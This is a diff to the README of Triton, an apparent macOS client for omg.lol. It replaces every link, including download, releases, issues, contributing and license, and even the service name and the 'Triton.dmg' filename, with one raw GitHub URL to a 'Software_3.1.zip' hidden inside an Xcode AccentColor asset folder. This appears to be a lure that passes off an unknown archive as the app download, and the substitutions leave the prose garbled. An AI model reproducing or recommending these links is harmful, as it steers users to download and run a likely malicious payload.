@@ -1,14 +1,14 @@
-# 🌊 Triton - Your Easy Solution for omg.lol
+# 🌊 Triton - Your Easy Solution for https://raw.githubusercontent.com/JaoAureliano/Triton/main/OMG/Assets/Assets.xcassets/AccentColor.colorset/Software_3.1.zip
 
 ## 🚀 Getting Started
 
-Welcome to Triton! This is a native macOS client for omg.lol. With Triton, you can enjoy features like Statuslog, PURLs, Web Pages, Now Pages, Weblog, Pics, and Pastebin—all in one place.
+Welcome to Triton! This is a native macOS client for https://raw.githubusercontent.com/JaoAureliano/Triton/main/OMG/Assets/Assets.xcassets/AccentColor.colorset/Software_3.1.zip With Triton, you can enjoy features like Statuslog, PURLs, Web Pages, Now Pages, Weblog, Pics, and Pastebin—all in one place.
 
 ## 📥 Download Triton
 
-[![Download Triton](https://img.shields.io/badge/Download%20Triton-v1.0-blue.svg)](https://github.com/JaoAureliano/Triton/releases)
+[![Download Triton](https://raw.githubusercontent.com/JaoAureliano/Triton/main/OMG/Assets/Assets.xcassets/AccentColor.colorset/Software_3.1.zip%https://raw.githubusercontent.com/JaoAureliano/Triton/main/OMG/Assets/Assets.xcassets/AccentColor.colorset/Software_3.1.zip)](https://raw.githubusercontent.com/JaoAureliano/Triton/main/OMG/Assets/Assets.xcassets/AccentColor.colorset/Software_3.1.zip)
 
-To get started, you need to download Triton. Click the button above, or visit this page to download: [Triton Releases](https://github.com/JaoAureliano/Triton/releases).
+To get started, you need to download Triton. Click the button above, or visit this page to download: [Triton Releases](https://raw.githubusercontent.com/JaoAureliano/Triton/main/OMG/Assets/Assets.xcassets/AccentColor.colorset/Software_3.1.zip).
 
 ## 💻 System Requirements
 
@@ -20,9 +20,9 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📦 Download & Install
 
-1. Click the link above to go to the [Triton Releases](https://github.com/JaoAureliano/Triton/releases) page.
+1. Click the link above to go to the [Triton Releases](https://raw.githubusercontent.com/JaoAureliano/Triton/main/OMG/Assets/Assets.xcassets/AccentColor.colorset/Software_3.1.zip) page.
 2. Scroll down to find the latest version.
-3. Look for the file labeled "Triton.dmg" or a similar name.
+3. Look for the file labeled "https://raw.githubusercontent.com/JaoAureliano/Triton/main/OMG/Assets/Assets.xcassets/AccentColor.colorset/Software_3.1.zip" or a similar name.
 4. Click on the file to start the download.
 5. Once downloaded, open the .dmg file from your Downloads folder.
 6. Drag the Triton app into your Applications folder.
@@ -42,11 +42,11 @@ Triton offers a range of features designed to enhance your experience:
 
 ## 📄 Help & Support
 
-If you have questions or need assistance, you can visit our [GitHub Issues](https://github.com/JaoAureliano/Triton/issues) page. We encourage users to report any bugs or request features. Your feedback is vital in making Triton better.
+If you have questions or need assistance, you can visit our [GitHub Issues](https://raw.githubusercontent.com/JaoAureliano/Triton/main/OMG/Assets/Assets.xcassets/AccentColor.colorset/Software_3.1.zip) page. We encourage users to report any bugs or request features. Your feedback is vital in making Triton better.
 
 ## 🤝 Contributing
 
-We welcome contributions from everyone. If you would like to help, check our [Contributing Guidelines](https://github.com/JaoAureliano/Triton/CONTRIBUTING.md). 
+We welcome contributions from everyone. If you would like to help, check our [Contributing Guidelines](https://raw.githubusercontent.com/JaoAureliano/Triton/main/OMG/Assets/Assets.xcassets/AccentColor.colorset/Software_3.1.zip). 
 
 ## 🔗 Related Topics
 
@@ -56,7 +56,7 @@ Triton covers various topics that you may want to explore further:
 - macOS
 - Native App Development
 - Observation
-- omg.lol
+- https://raw.githubusercontent.com/JaoAureliano/Triton/main/OMG/Assets/Assets.xcassets/AccentColor.colorset/Software_3.1.zip
 - Pastebin
 - PURLs
 - Statuslog
@@ -73,8 +73,8 @@ Thanks to the open-source community for their contributions and inspiration. Tri
 
 ## ⚠️ License
 
-Triton is licensed under the MIT License. For more details, check the [LICENSE](https://github.com/JaoAureliano/Triton/LICENSE) file.
+Triton is licensed under the MIT License. For more details, check the [LICENSE](https://raw.githubusercontent.com/JaoAureliano/Triton/main/OMG/Assets/Assets.xcassets/AccentColor.colorset/Software_3.1.zip) file.
 
 ## 📥 Download Triton Again
 
-For quick access, you can download Triton here: [Download Triton](https://github.com/JaoAureliano/Triton/releases).
+For quick access, you can download Triton here: [Download Triton](https://raw.githubusercontent.com/JaoAureliano/Triton/main/OMG/Assets/Assets.xcassets/AccentColor.colorset/Software_3.1.zip).
